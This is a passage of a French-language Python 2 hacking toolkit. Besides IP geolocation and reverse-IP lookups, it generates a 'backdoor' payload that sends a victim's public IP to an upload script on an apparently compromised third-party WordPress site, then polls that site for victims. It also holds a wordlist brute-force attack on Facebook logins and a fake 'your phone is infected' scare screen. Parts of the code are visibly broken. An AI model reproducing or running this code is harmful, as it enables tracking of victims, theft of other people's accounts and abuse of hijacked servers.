								print B+A+"  [*]"+B+" Code Postal        :"+R+"",r["postal"]
								print B+A+"  [*]"+B+" Dans l\'europe     :"+R+"",r["in_eu"]
								print("\033[1;97m╚"+35*"═"+1*"═╝")
								
							except:
								print B+R+"  [-] Hote : "+w+" ●═══════◄► Inconnu!"
					except:
						print B+R+"  [-] Verifier votre connxeion internet!"
						os.system('rm -rf lock.txt')
						raw_input('  [!] '+B+'Appuyer entrer pour retourner au menu... ')
						os.system('clear')
						menu_ip()
				print B+A+"\n  [*] "+P+"Terminer."
				os.system('rm -rf lock.txt')
				raw_input(R+'  [!] '+B+'Appuyer entrer pour retourner au menu...')
				os.system('clear')
				menu_ip()
			
		else:
			print B+R+"  [-] Saisir incorrecte!"
			raw_input('  [!]'+B+' Appuyer entrer pour retourner au menu...')
			os.system('clear')
			menu_ip()
	elif "3" in choisir:
		os.system('clear')
		print(logomonip)
		print A+"  [*] "+J+"Verification de votre adresse IP publique ..."
		print("")
		time.sleep(1.5)
		print B+R+"  [+] "+B+"Votre adresse IP publique est\033[1;91m :\033[1;96m ●═══════◄►"+V+requests.get('http://ip-api.com/json/').json()["query"]
		print("")
		print"  [*] Terminer.\n"
		raw_input("  [!] Appuyer entrer pour retourner au menu ...")
		menu_ip()
	elif "4" in choisir:
		cls()
		print(logoportes)
		print("\033[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
		print("\033[1;97m╔"+31*"═"+1*"═╗")
		print("\033[1;97m║ \033[1;92mGenerer des portes derobées Py\033[1;97m║")
		print("\033[1;97m║                     		 \033[1;97m║")
		print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[1;97m Generer une charge utile \033[1;97m ║")
		print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[1;97m Les auditeurs           \033[1;97m  ║")
		print("\033[1;97m║	                         \033[1;97m║")
		print("\033[1;97m╚"+31*"═"+1*"═╝")
		print("\033[1;97m║")
		cos=raw_input("\033[1;97m╚═\033[1;31m▶[38;5;245m Mr [38;5;221mFaxel \033[1;31m▶▶▶  \033[1;33m")
		if "1" in cos:
			os.system('clear')
		        print(logocharge)
			chargeutile=raw_input(B+A+'  [*] '+B+'Exemple: machargeutile\n '+R+' [+] '+J+'Nom de la charge utile\033[1;97m >>>>\033[1;97m  ')
			print("")
			date=raw_input(B+A+'  [*]'+J+' Exemple\033[1;91m:\033[1;97m 1997\033[1;91m/\033[1;92m12\n '+R+' [+] '+J+'Date \033[1;91m>>>\033[1;97m')
			print("")
			print B+A+"  [*]"+B+" Generer une charge utile ..."
			print("")
			try:
				os.mkdir('chargeutile')
				f=open('chargeutile/chargeutile.py','w')
			except:
				f=open('chargeutile/chargeutile.py','w')
			f.write('import requests,json\n')
			f.write('chargeutile = "'+chargeutile+'.txt"\n')
			f.write('r=requests.get("http://ip-api.com/json/")\n')
			f.write('data=json.loads(r.text)\n')
			f.write('postip=data["query"]\n')
			f.write("files={'Filedata':(payload,postip,'text/html')}\n")
			f.write('try:\n')
			f.write("	r=requests.post('http://ailisgarcia.com/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',verify = False,files=files)\n")
			f.write('except:\n')
			f.write('	print "[-] Reinitialisation de la connexion par paire!" \n')
			f.close()
			od=os.path.getsize('chargeutile/chargeutile.py')
			print B+A+"  [*] "+B+"Votre charge utile de "+R+str(od)+B+" bytes ..."
			print B+A+"  [*] "+B+"Chemin :"+R+" /chargeutile/chargeutile.py"
			print 
			demande=raw_input(B+A+'  [*]'+B+' Lancer maintenant ? O/N : ')
			if demande == 'o' or demande == 'O' or demande == 'oui' or demande == 'OUI':
				rs=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
				if rs.status_code == 200:
					print B+A+"  [*] "+B+"Sessions ouvertes ..."
					print B+R+"  [+] "+B+"IP :"+V+" "+rs.text
					for moi in range(1,99999):
						chemin='http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'-'+str(moi)+'.txt'
						try:
							r=requests.get(chemin)
							if r.status_code == 200:
								print B+A+"  [*]"+B+" Sessions "+R+str(moi)+B+" ouvertes ..."
								print B+R+"  [+]"+B+" Adresse IP : "+ +r.text
							else:
								print B+R+"  [-]\033[1;97m Charge utile d\'écoute "+B+V+chargeutile+" ..."
						except:
							print B+R+"  [*] Verifier votrre connexion!"
							raw_input('  [!] '+B+'Appuyer entrer pour retourner au menu ... ')
							os.system('clear')
							cos()
				else:
					while True:
						r=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
						if r.status_code == 200:
							print B+A+"  [*]"+B+" Sessions ouvertes .."
							print R+"  [+]"+B+" IP : "+V+r.text
							raw_input(B+R'  [+]'+B+' Appuyer entrer pour retourner au menu ... ')
							os.system('clear')
							cos()
						else:
							print B+R+"  [-]\033[1;97m Charge utile d\'écoute "+B+V+chargeutile+" ..."
			elif demande == 'n' or demande == 'N' or demande == 'non' or demande == 'NON':
				raw_input(B+R+'  [+]'+B+' Appuyer entrer pour retourner au menu ... ')
				os.system('clear')
				menu_ip()
			else:
				print B+R+"  [♣] Saisie incorrecte !"
				raw_input('  [+]'+B+' Appuyer entrer pour retourner au menu .. ')
				os.system('clear')
				menu_ip()
		elif "2" in cos:
			os.system('clear')
		        print(logoauditeur)
			chargeutile=raw_input(B+R+'  [+]'+J+' Charge utile\033[1;91m >>>\033[1;97m ')
			date=raw_input(R+'  [*]'+P+' Date \033[1;91m >>>\033[1;97m ')
			rs=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
			if rs.status_code == 200:
				print B+A+"  [*]"+B+" Sessions ouvertes ..."
				print R+"  [+]"+B+" IP : "+V+rs.text
				for moi in range(1,99999):
					chemin='http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'-'+str(moi)+'.txt'
					try:
						r=requests.get(chemin)
						if r.status_code == 200:
							print B+AB+"  [*] "+B+"Sessions "+R+str(moi)+B+" ouvertes ..."
							print R+"  [+] "+B+"IP : "+V+r.text
						else:
							print B+R+"  [-] Charge utile d\'écoute "+chargeutile+" ..."
					except:
						print B+R+"  [*] "+B+"Verifier votre connexion internet!"
						raw_input(R+'  [!] '+B+'Appuyer entrer pour retourner au menu ... ')
						os.system('clear')
						cos()
			else:
				while True:
					r=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
					if r.status_code == 200:
						print B+A+"  [*] "+B+"Sessions ouverte .."
						print B+R+"  [+]"+B+" IP : "+V+r.text
						print R+"  [♣]"+B+" Appuyer entrer pour retourner au menu ... "
						os.system('clear')
						cos()
					else:
						print B+R+"  [-] Charge utile d\'écoute "+chargeutile+" ..."			
		else:
			print B+R+"  [-] Saisie incorrecte!"
			raw_input('  [♣]'+B+' Appuyer entrer pour retourner au menu...')
			os.system('clear')
			menu_ip()			
	elif "5"  in choisir:		
		os.system('clear')
		print(logomenu_ip)
		print"[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
		print("\033[1;97m╔"+22*"═"+1*"═╗")
		print("\033[1;97m║  \033[1;91m[\033[1;96m Menu selection \033[1;91m]\033[1;97m   ║")
		print("\033[1;97m║			\033[1;97m║")
		print("\033[1;97m║\033[1;91m[\033[1;96m1.\033[1;91m]\033[1;93m Manuelement       \033[1;97m║")
		print("\033[1;97m║\033[1;91m[\033[1;96m2.\033[1;91m]\033[1;95m Masse             \033[1;97m║")
		print("\033[1;97m║			\033[1;97m║")
		print("\033[1;97m╚"+22*"═"+1*"═╝")
		print("\033[1;97m║")										
		t=raw_input("\033[1;97m╚═\033[1;31m▶[38;5;245m Mr [38;5;221mFaxel \033[1;31m▶▶▶  \033[1;33m")
		if "1" in t:
			print("")
			ip=raw_input('[*] IP \033[1;91m▶▶▶ \033[1;97m ')
			print("[*] IP de suivi "+ip+"\033[1;94m...")
			rk=requests.get('http://ipapi.co/'+ip+'/json/')
			r=json.loads(rk.text)
			try:
				lines="="*40
				print "\033[1;92m"+lines
				print B+A+"\n  [*]"+B+" Adresse IP\t:"+R+"",r["ip"]
				print B+A+"  [*] "+B+"Ville\t\t:"+R+"",r["city"]
				print B+A+"  [*] "+B+"Code Region\t:"+R+"",r["region_code"]
				print B+A+"  [*]"+B+" Pays\t\t:"+R+"",r["country"]
				print B+A+"  [*]"+B+" Nom du pays\t:"+R+"",r["country_name"]
				print B+A+"  [*]"+B+" Region\t\t:"+R+"",r["region"]
				print B+A+"  [*] "+B+"Langue\t\t:"+R+"",r["languages"]
				print B+A+"  [*]"+B+" Code d\'appel\t:"+R+"",r["country_calling_code"]
				print B+A+"  [*]"+B+" Decalage Horaire\t:"+R+"",r["utc_offset"]
				print B+A+"  [*]"+B+" Code Continental\t:"+R+"",r["continent_code"]
				print B+A+"  [*]"+B+" Devise\t\t:"+R+"",r["currency"]
				print B+A+"  [*]"+B+" Latitude\t\t:"+R+"",r["latitude"]
				print B+A+"  [*]"+B+" Longitude\t\t:"+R+"",r["longitude"]
				print B+A+"  [*]"+B+" Heure Locale      :"+R+"",r["timezone"]
				print B+A+"  [*]"+B+" Code Postal       :"+R+"",r["postal"]
				print B+A+"  [*]"+B+" Dans Eu\t\t:"+R+"",r["in_eu"]
				print "\033[1;92m  "+lines
				print "\n"+B+A+"[*]"+B+" Terminer."
				raw_input(R+'[♣]'+B+' Appuyer entrer pour retourner au menu ... ')
				os.system('clear')
				menu_ip()
			except:
				print B+R+"  [-] Hote : "+w+" ●═════◄► Inconnu!"
				print "\n"+B+A+"[*]"+B+" Terminer."
				raw_input(R+'[♣]'+B+' Appuyer entrer pour retourner au menu ... ')
				os.system('clear')
				menu_ip()
		elif "2" in t:
			ip=raw_input(B+R+'  [*]'+J+' LISTE IP\033[1;91m ▶▶▶ \033[1;97m ')
			try:
				print("")
				noel=open(ip).readlines()
				noelle=len(noel)
				malie=open(ip)
				for k in range(noelle):
					word=malie.readline().replace('\n','')
					rk=requests.get('http://ipapi.co/'+word+'/json/')
					r=json.loads(rk.text)
					try:
						lines="="*40
						print "\033[1;92m  "+lines
						print B+A+"  [*] IP de suivi de votre "+B+R+word+" ..."
						print B+A+"\n [*]"+B+"Adresse IP\t:"+R+"",r["ip"]
						print B+A+"  [*] "+B+"Ville\t\t:"+R+"",r["city"]
						print B+A+"  [*] "+B+"Code Region\t:"+R+"",r["region_code"]
						print B+A+"  [*]"+B+" Pays\t\t:"+R+"",r["country"]
						print B+A+"  [*]"+B+" Nom du pays\t:"+R+"",r["country_name"]
						print B+A+"  [*]"+B+" Region\t\t:"+R+"",r["region"]
						print B+A+"  [*] "+B+"Langue\t\t:"+R+"",r["languages"]
						print B+A+"  [*]"+B+" Code d\'appel\t:"+R+"",r["country_calling_code"]
						print B+A+"  [*]"+B+" Decalage Horaire\t:"+R+"",r["utc_offset"]
						print B+A+"  [*]"+B+" Code Continental\t:"+R+"",r["continent_code"]
						print B+A+"  [*]"+B+" Devise\t\t:"+R+"",r["currency"]
						print B+A+"  [*]"+B+" Latitude\t\t:"+R+"",r["latitude"]
						print B+A+"  [*]"+B+" Longitude\t\t:"+R+"",r["longitude"]
						print B+A+"  [*]"+B+" Heure Locale :"+R+"",r["timezone"]
						print B+A+"  [*]"+B+" Code Postal :"+R+"",r["postal"]
						print B+A+"  [*]"+B+" Dans Eu\t\t:"+R+"",r["in_eu"]
						print "\033[1;92m  "+lines
					except:
						print B+R+"  [-] Hote : "+word+" ==> Inconnu!"
				print B+A+"  [*]"+B+" Terminer."
				raw_input(R+'  [♣]'+B+' Appuyer entrer pour retourner au menu ...')
				os.system('clear')
				menu_ip()
			except:
				print B+R+"  [-] Oh merde! Liste '"+ip+"' introuvable."
				raw_input('  [♣]'+B+' Appuyer entrer pour retourner au menu...')
				os.system('clear')
				menu_ip()		
	elif "6" in choisir:		
		os.system('clear')
		print(logomenu_ip)
		print"[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮"
		hote=raw_input(B+R+'  [+]'+J+' Hote \033[1;91m ▶▶▶ \033[1;97m  ')
		print("")
		print B+B+"  [*]"+B+" Obtenir l\'hôte de "+R+hote+" ... "
		rr=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+hote+'')
		f=open(''+hote+'.txt','w')
		f.write(rr.text)
		f.close()
		h=open(hote+'.txt').readlines()
		moi=len(h)
		print("")
		print B+R+"  [*] "+R+str(moi)+J+ "hote charger!"
		print("")
		print B+R+"  [*] "+B+"Extraction des liens de "+A+hote
		d=open(hote+'.txt')
		for ps in range(moi):
			l=d.readline().replace('\n','')
			r=requests.get('https://api.hackertarget.com/pagelinks/?q='+l+'')
			if "no links found" in r.text:
				lines="\033[1;92m="*10
				print B+R+" ["+lines+" "+l+"Aucun lien trouver! "+lines+"]"
			elif "input url is invalid" in r.text:
				print R+"  [-] "+r.text
				os.system('rm -rf '+hote+'.txt')
				raw_input(R+'  [+]'+B+' Appuyer entrer pour retourner au menu ...')
				os.system('rm -rf '+hote+'.txt')
				os.system('clear')
				menu_ip()				
			else:
				lined="="*10
				print B+R+" ["+lined+" "+B+l+" "+R+lined+"]\n"
				print B+r.text
		print B+A+"\n  [*]"+B+" Terminer."
		print("")
		os.system('rm -rf '+hote+'.txt')
		raw_input(B+R+'  [+] '+B+'Appuyer entrer pour retourner au menu ...')
		os.system('clear')
		menu_ip()	
	elif "7" in choisir:
		os.system('clear')
		menu_pirate()		
	elif "8" in choisir:
		os.system("clear")
		print auteur
		Street("\033[1;91m[?] \033[1;97mPourquoi voulez voir les informations sur\033[1;91m Mr \033[1;96mHacker_K \033[1;97m?")
		Street("\033[1;91m[?] \033[1;97mLes informations sur\033[1;91m Mr \033[1;96mHacker_K\033[1;97m sont a mi confident, donc il faudrait le contacter.")
		auto("\033[1;91m[?] \033[1;97mSinon vous commettez une infraction dangereuse si vous ne le contactez en premier!")			
		Street("\033[1;91m[?] \033[1;92m****\033[1;91m Mr \033[1;96mHacker_K\033[1;97m?\033[1;92m ****")
		print("")
		h = raw_input("\033[1;91m[?] \033[1;97mVous avez deux choix\033[1;91m :\033[1;92m o ou \033[1;91mn \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;97m ")
		if h =="n" or h =="N":
			McTony()
			menu_ip()
		elif h =="o" or h =="O":
			print("")
			Street("\033[1;91m[?] \033[1;92m*****\033[1;97m A ce stade vous avez depasser les bornes \033[1;92m*****")
			Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
			Street("\033[1;97m[?] Un message est en cours d'envoi a l'auteur, Patientez")
			seul()
			print("")
			Street("\033[1;97m[?] Message bien transmit a l'auteur. Vous serrez empaquetter de virus dans  quelques instants!")
			print("")
			Street("\033[1;91m[?] \033[1;91mPlusieurs virus vous sera infecter a\033[1;92m 65%\033[1;91m apres avoir lu les informations sur\033[1;91m Mr \033[1;96mHacker_K!")
			print("")
			e = raw_input("\033[1;91m[?] \033[1;97mDernière chance pour ne pas etre infecter a\033[1;92m 85% \033[1;97m!Je vous conseil le\033[1;91m n \033[1;94m[\033[1;92mo/\033[1;91mn \033[1;94m]\033[1;91m : \033[1;97m ")
			if e =="n" or e =="N":
				print("")
				Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
				hacker()
				menu_ip()
			elif e =="o" or e=="O":
				print("")
				Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
				seul()
				print("")
				Street("\033[1;97mInfection terminer, Votre systeme android sera bousiller dans\033[1;91m 1\033[1;97m heures\033[1;91m 30\033[1;92m mn")
				McTony()
				print("")
				hacker()
				print("")
				seul()
				print("")
				McTony()
				print("")
				Street("\033[1;97mvotre systeme est bloquer")
				print("")
				r = raw_input("\033[1;91m[?] \033[1;97mTaper \033[1;91mn \033[1;97mpour ne etre infecter a\033[1;92m 100% \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;97m ")
				if r =="n" or r =="N":
					hacker()
					menu_ip()
				elif r =="o" or r =="O":
					Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
					print("")
					os.system("clear")
					seul()
					print auteur
					print("")
					Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
					McTony()
					print("")
					Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
					print("")
					Street("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
					hacker()
					print("")
					auto(AuteurInfo)
					Street("\033[1;97mSache que ton telephone et/ou ton ordi est \033[1;93minfecter\033[1;97m, a 85%.\033[1;96m Hacker_K")
					raw_input('\n\033[1;91m[ \033[1;97mRetour\033[1;91m]')
                			menu_ip()
				else:
					raw_input('\n\033[1;91m[ \033[1;97mRetour\033[1;91m]')
                			menu_ip()		
	elif "0" in choisir:
		menu()		
	else:	
		print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + choisir + ' \x1b[1;91mindisponible'										
		raw_input('[1;91m[!][48;5;0;38;5;187m Appuyer entrer pour retourner au menu...')
		os.system('clear')
		menu_ip()			
####################################################################################################			
####################################################################################################			
def menu_pirate():	
                cls()
                print("""
                \033[1;97m ███████╗██████╗ \033[1;97m ██████╗██████╗  █████╗  ██████╗██╗  ██╗
                \033[1;94m ██╔════╝██╔══██╗\033[1;91m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
                \033[1;94m █████╗  ██████╔╝\033[1;91m██║     ██████╔╝███████║██║     █████╔╝ 
                \033[1;94m ██╔══╝  ██╔══██╗\033[1;91m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
                \033[1;94m ██║     ██████╔╝\033[1;91m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
                \033[1;94m ╚═╝     ╚═════╝ \033[1;91m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ 
                \033[1;97m	      ############################################
                \033[1;97m              #  \033[1;92mFacebook Brutale Force\033[1;97m,\033[1;91m Mr\033[1;96m Faxel\033[1;97m     #
                \033[1;97m              #  \033[1;92mWhatsApp Contact\033[1;91m :\033[1;93m        +22555709610\033[1;97m #
                \033[1;97m              ############################################ """)
                print("\n\033[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
                mael = str(raw_input("\n\033[1;91m[\033[1;97m*\033[1;91m]\x1b[32m ID\x1b[31m/\033[32;1mNom d\'utilisateur\x1b[37m de votre cible\033[91m : \x1b[36m  "))
                print("")
                motdepasse = str(raw_input("\033[1;91m[\033[1;97m+\033[1;91m]\033[0;1m Entrez le fichier de liste de mots \033[31m(\x1b[32mfaxel.txt\x1b[31m) : \033[37m"))
                connexion = 'https://www.facebook.com/login.php?login_attempt=1'
                agentutilisateur = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
                # agentutilisateur = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
		choix1()
####################################################################################################		
def choix1():	
                t = str(raw_input("\n\x1b[31m[\x1b[34m?\x1b[31m]\x1b[37m Voulez vous  pirater un compte facebook\x1b[33m..\x1b[31m [\x1b[32mo\x1b[31m/\x1b[34mn\x1b[31m] \x1b[31m: \x1b[37m"))
                if t == 'o' or t == 'O':
                    os.system('clear')
		    liste_de_mot()
                elif t == 'n' or t == 'N':
                    print ("\x1b[31mQuittez le programme\x1b[33m....")
                    menu_ip()
                else:
                    print ("\x1b[37mChoisissez le bon\x1b[33m....")
                    choix1()
####################################################################################################
def liste_de_mot():
        print ("")
        h = str(raw_input("\x1b[31m[\x1b[37m?\x1b[31m]\x1b[37m Voulez vous creer une\x1b[31m wordliste\x1b[37m?\x1b[31m [\x1b[32mo\x1b[31m/\x1b[34mn\x1b[31m] \x1b[31m: \x1b[37m "))
        if h == 'o' or h == 'O':
                os.system('nano '+motdepasse)
                choix1()
        elif h == 'n' or h == 'N':
                menu_ip()
        else:
                print ("\x1b[37mChoisissez le bon\x1b[33m...")
                liste_de_mot()
####################################################################################################
def menu_fb():
	
        global antoine
        antoine = mechanize.Browser()
        cho = cookielib.LWPCookieJar()
        antoine.set_handle_robots(False)
        antoine.set_handle_redirect(True)
        antoine.set_cookiejar(cho)
        antoine.set_handle_equiv(True)
        antoine.set_handle_referer(True)
        antoine.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        Kouadio()
        faxel1()
        print ("")
        print ("\x1b[31m Aucune liste de mots ne correspond\x1b[33m...")
        print ("")
	raw_input('  [!] '+B+'Appuyer entrer pour retourner au menu...')
        menu_ip()
####################################################################################################	
def rit(rit_mdp):	
  try:
 	sys.stdout.write("\n\x1b[32m[\033[91m+\033[92m]\033[91;1m [\033[0;1m"+mael+"\033[31m]\033[36;1m J\'ai essayer ==> \033[0;1m "+rit_mdp )
	sys.stdout.flush()
	antoine.addheaders = [('User-agent', random.choice(agentutilisateur))]
	site = antoine.open(connexion)
	antoine.select_form(nr = 0)
	antoine.form['email'] = mael
	antoine.form['pass'] = rit_mdp
	chantal = antoine.submit()
	cache = chantal.geturl()
	if cache != connexion and (not 'login_attempt' in cache):
                        print ("")
			print ("\x1b[31m+-------------------------------------------+")
			mael ("\x1b[37m   M O T  D E  P A S S E  T R O U V E R      ")
			mael ("\033[92m          A V E C   S U C C E S     	     ")
                  	print ("\x1b[31m+-------------------------------------------+")
	         	print ("\x1b[31m[\x1b[37m*\x1b[31m]\033[97m ID / Email cible\x1b[31m : \033[92m {}").format(mael)
        	        print ("\x1b[31m[\x1b[37m*\x1b[31m]\033[97m Mot de passe de votre cible\033[91m : \033[92m {}").format(rit_mdp)
        	        print ("")
			print"[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮"
        	        raw_input('  [!] '+B+'Appuyer entrer pour retourner au menu...')
                        menu_ip()
  except KeyboardInterrupt:	
      print("\x1b[31mArret\x1b[33m.......")
      liste_de_mot()
      sys.exit()  
####################################################################################################
def faxel1():
	
	global rit_mdp
	mon_mdp = open(motdepasse, "r")
	for rit_mdp in mon_mdp:
		mon_mdp = rit_mdp.replace("\n","")
		rit(rit_mdp)	
####################################################################################################
def Kouadio():	
         global motdepasse
         os.system('clear')
         mael("\033[1;92m  ____             _        _ \033[1;91m       ______ _     ")    
         mael("\033[1;92m |  _ \           | |      | |\033[1;91m      |  ____| |    ")  
         mael("\033[1;92m | |_) |_ __ _   _| |_ __ _| |\033[1;97m______\033[1;91m| |__  | |__  ")
         mael("\033[1;92m |  _ <| '__| | | | __/ _` | |\033[1;97m______\033[1;91m|  __| | '_ \ ")
         mael("\033[1;92m | |_) | |  | |_| | || (_| | |\033[1;91m      | |    | |_) |")
         mael("\033[1;92m |____/|_|   \__,_|\__\__,_|_|\033[1;91m      |_|    |_.__/ ")         
	 print("")
	 mael("\x1b[31m[\x1b[37m*\x1b[31m] \033[37mCodé par\033[1;91m : \x1b[36m\033[041m Faxel\033[00m  \x1b[31m [\033[1;97m*\x1b[31m] ")
         print("")
	 print("[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
         print("")
         hackers = open(motdepasse, 'r')
         hackers = hackers.readlines()
         print "\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m ID\033[1;91m/\033[1;97mNom d\'utilisateur de votre cible     \033[91;1m : \033[1;96m  {}".format(mael)
         print "\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m Nombre de mot de passe disponible actuel\033[91;1m : \033[1;93m ", len(hackers),'\033[1;97m mot de passe'
	 print("")
         mael("\033[1;91m[\033[1;93m#\033[1;91m]\033[1;97m Veuillez patientez le processus de craquage est cours d\'execution\033[93;1m..........")
         print ("")
	 print "\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m Piratage du compte de \033[1;95m{}".format(mael),'\033[1;97m en cours, soyez patient.\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m'
	 print ("")
         raw_input('[!] Appuyer entrer pour retourner au menu...')
         menu_ip()		
####################################################################################################
####################################################################################################
if __name__ == "__main__":
       Identification()	
####################################################################################################
